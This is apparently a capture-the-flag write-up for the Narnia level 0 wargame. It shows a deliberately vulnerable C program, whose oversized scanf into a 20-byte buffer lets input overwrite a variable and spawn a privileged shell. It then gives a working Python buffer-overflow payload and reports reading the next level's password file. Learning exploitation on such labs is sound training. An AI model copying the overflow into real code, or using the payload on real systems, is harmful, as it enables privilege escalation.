#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}

ACTION:

( python3 -c 'import sys; sys.stdout.buffer.write(b"AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde")'; cat ) | ./narnia0

Then I went into /etc/narnia_pass/narnia1 and got the password.

Trying to alter the program directly using non-ASCII characters is difficultbecause the terminal is using UTF-8 encoding.For example, while the character ï corresponds to 0xEF in extended ASCII, in UTF-8 it's encoded in two bytes as 0xC3 0xAF. Using python to emit raw bytes avoids this issue. 
Another issue is that, when the payload is delivered through a pipe, the pipe is normally closed immediately afterwards. The spawned shell receives EOF on stdin and exists. Appending 'cat' keeps stdin open, allowing interaction witht he shell and use the privileges previously obtained.

